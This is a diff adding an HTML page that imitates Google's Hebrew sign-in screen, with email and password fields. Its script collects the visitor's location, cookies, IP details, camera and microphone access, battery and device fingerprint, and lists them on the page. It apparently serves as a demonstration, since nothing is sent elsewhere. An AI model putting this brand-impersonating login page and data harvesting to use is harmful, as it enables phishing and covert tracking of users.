@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en" dir="rtl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body class="bg-[#f0f4f9] h-screen flex justify-center items-center">
+    <div
+      class="w-[1100px] mr-auto ml-auto h-[600px] max-lg:h-screen max-lg:w-screen bg-white rounded-xl py-8 px-10 max-lg:py-5 max-lg:px-5 overflow-auto"
+    >
+      <svg
+        xmlns="https://www.w3.org/2000/svg"
+        width="48"
+        height="48"
+        viewBox="0 0 48 48"
+        aria-hidden="true"
+        jsname="jjf7Ff"
+      >
+        <path
+          fill="#4285F4"
+          d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"
+        ></path>
+        <path
+          fill="#34A853"
+          d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"
+        ></path>
+        <path
+          fill="#FBBC05"
+          d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"
+        ></path>
+        <path
+          fill="#EA4335"
+          d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"
+        ></path>
+        <path fill="none" d="M2 2h44v44H2z"></path>
+      </svg>
+      <div class="flex mt-10 max-lg:flex-col max-lg:mt-4">
+        <div class="w-[50%] max-lg:w-full max-lg:mb-10">
+          <div
+            class="text-[2.75rem] leading-[4rem] max-lg:text-[2rem] max-lg:font-light"
+          >
+            כניסת משתמש
+          </div>
+          <p class="mt-6 max-lg:text-[0.8rem] max-lg:mt-2 max-lg:font-light">
+            מהו חשבון Google שלך
+          </p>
+        </div>
+        <div class="self-start relative">
+          <form action="" class="flex flex-col gap-10">
+            <input
+              type="text"
+              placeholder="כתובת אמייל"
+              class="h-[28px] px-[13px] py-[30px] w-[400px] border-2 rounded-xl max-lg:w-full"
+            />
+            <input
+              type="password"
+              placeholder="סיסמה"
+              class="h-[28px] px-[13px] py-[30px] w-[400px] max-lg:w-full border-2 rounded-xl"
+            />
+            <p class="max-lg:font-light">
+              זה לא המחשב שלך? מומלץ להשתמש במצב אורח <br />כדי להיכנס לחשבון
+              בפרטיות.
+              <span class="text-[#0b57d0]"
+                ><a
+                  href="https://support.google.com/chrome/answer/6130773?hl=iw"
+                  target="_blank"
+                >
+                  מידע נוסף על השימוש במצב אורח</a
+                >
+              </span>
+            </p>
+            <button
+              class="absolute bottom-[-25%] left-0 bg-[#0b57d0] h-[40px] text-white px-[24px] rounded-full hover:opacity-80"
+            >
+              כניסה
+            </button>
+          </form>
+        </div>
+      </div>
+      <div
+        id="user-data"
+        class="mt-20 p-5 bg-gray-100 rounded-xl max-lg:w-full"
+      >
+        <!-- User data will be displayed here -->
+      </div>
+    </div>
+
+    <script>
+      let DataOnUser = [];
+
+      // Request access to the geolocation
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            let latitude = position.coords.latitude;
+            let longitude = position.coords.longitude;
+            DataOnUser.push(
+              "Location: " +
+                "Latitude- " +
+                position.coords.latitude +
+                " Longitude- " +
+                position.coords.longitude
+            );
+          },
+          function (error) {
+            switch (error.code) {
+              case error.PERMISSION_DENIED:
+                DataOnUser.push(
+                  "Location: User denied the request for Geolocation."
+                );
+                break;
+              case error.POSITION_UNAVAILABLE:
+                DataOnUser.push(
+                  "Location: Location information is unavailable."
+                );
+                break;
+              case error.TIMEOUT:
+                DataOnUser.push(
+                  "Location: The request to get user location timed out."
+                );
+                break;
+              case error.UNKNOWN_ERROR:
+                DataOnUser.push("Location: An unknown error occurred.");
+                break;
+            }
+          }
+        );
+      } else {
+        DataOnUser.push(
+          "Location: Geolocation is not supported by this browser."
+        );
+      }
+
+      // Request access to the microphone and camera
+      navigator.mediaDevices
+        .getUserMedia({ video: true, audio: true })
+        .then(function (localMediaStream) {
+          var video = document.querySelector("video");
+          if (video) {
+            video.srcObject = localMediaStream;
+            video.onloadedmetadata = function (e) {
+              // Optional: do something with the video here.
+            };
+          }
+        })
+        .catch(function (err) {
+          if (err.name === "NotAllowedError") {
+            DataOnUser.push("Error: Camera or microphone access was denied.");
+          }
+        });
+
+      // Get IP Data
+      fetch("http://ip-api.com/json")
+        .then((response) => response.json())
+        .then((data) => {
+          DataOnUser.push("IP Data: " + JSON.stringify(data));
+        });
+
+      // Get the main language
+      let language = navigator.language;
+      DataOnUser.push("Language: " + language);
+
+      // Get preferred languages list
+      let languageList = navigator.languages;
+      DataOnUser.push("Preferred Languages List: " + languageList);
+
+      // Get operating system
+      let os = navigator.appVersion;
+      DataOnUser.push("Operating System: " + os);
+
+      // Get referrer
+      let referrer = document.referrer;
+      if (referrer == "") {
+        referrer = "No Referrer";
+      }
+      DataOnUser.push("Referring Website: " + referrer);
+
+      // Get time of visit
+      let time = new Date();
+      DataOnUser.push("Visit Time: " + time);
+
+      // Get screen resolution
+      let screenResolution = `${screen.width}x${screen.height}`;
+      DataOnUser.push("Screen Resolution: " + screenResolution);
+
+      // Get Cookies are enabled or not
+      let cookiesBool = navigator.cookieEnabled;
+      DataOnUser.push("Cookies Enabled?: " + cookiesBool);
+
+      // Get Cookies
+      let cookies = document.cookie;
+      if (cookies == "") {
+        cookies = "No Cookies";
+      }
+      DataOnUser.push("Cookies: " + cookies);
+
+      // Get request method
+      let method = "GET";
+      DataOnUser.push("Method: " + method);
+
+      // Get request path
+      let path = window.location.pathname;
+      DataOnUser.push("Request Path: " + path);
+
+      // Get request parameters
+      let parameters = window.location.search;
+      if (parameters == "") {
+        parameters = "No Parameters";
+      }
+      DataOnUser.push("Request Parameters: " + parameters);
+
+      // Get User Agent String (browser, system etc)
+      let userAgent = navigator.userAgent;
+      DataOnUser.push("User Agent: " + userAgent);
+
+      // Get device type (mobile/desktop)
+      let deviceType = /mobile/i.test(userAgent) ? "Mobile" : "Desktop";
+      DataOnUser.push("Device Type: " + deviceType);
+
+      // Get battery level
+      if (navigator.getBattery) {
+        navigator.getBattery().then(function (battery) {
+          let batteryLevel = battery.level * 100 + "%";
+          DataOnUser.push("Battery Level: " + batteryLevel);
+        });
+      } else if (navigator.battery) {
+        let batteryLevel = navigator.battery.level * 100 + "%";
+        DataOnUser.push("Battery Level: " + batteryLevel);
+      }
+
+      // Get device memory information
+      if (navigator.deviceMemory) {
+        let memory = navigator.deviceMemory;
+        DataOnUser.push("Device Memory: " + memory + "GB");
+      } else {
+        DataOnUser.push(
+          "Device Memory: " +
+            "Memory information is not available in this browser."
+        );
+      }
+
+      // Get timezone
+      let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      DataOnUser.push("Timezone: " + timezone);
+
+      // Get online/offline status (if connected to the network)
+      let onlineStatus = window.navigator.onLine ? "Online" : "Offline";
+      DataOnUser.push("Online Status: " + onlineStatus);
+
+      fetch("https://api.ipify.org?format=json")
+        .then((response) => response.json())
+        .then((data) => {
+          DataOnUser.push("Public IP Address: " + data.ip);
+          displayUserData();
+        })
+        .catch((error) => {
+          console.error("Error fetching IP:", error);
+          displayUserData();
+        });
+
+      function displayUserData() {
+        const userDataDiv = document.getElementById("user-data");
+        userDataDiv.innerHTML =
+          '<h2 class="text-2xl font-bold mb-4 ">Collected User Data:</h2>';
+        const ul = document.createElement("ul");
+        ul.classList.add("list-disc", "pl-5", "space-y-2");
+        DataOnUser.forEach((data) => {
+          const li = document.createElement("li");
+          li.textContent = data;
+          li.classList.add("bg-white", "p-2", "rounded-md", "shadow-sm");
+          ul.appendChild(li);
+        });
+        userDataDiv.appendChild(ul);
+      }
+    </script>
+  </body>
+</html>
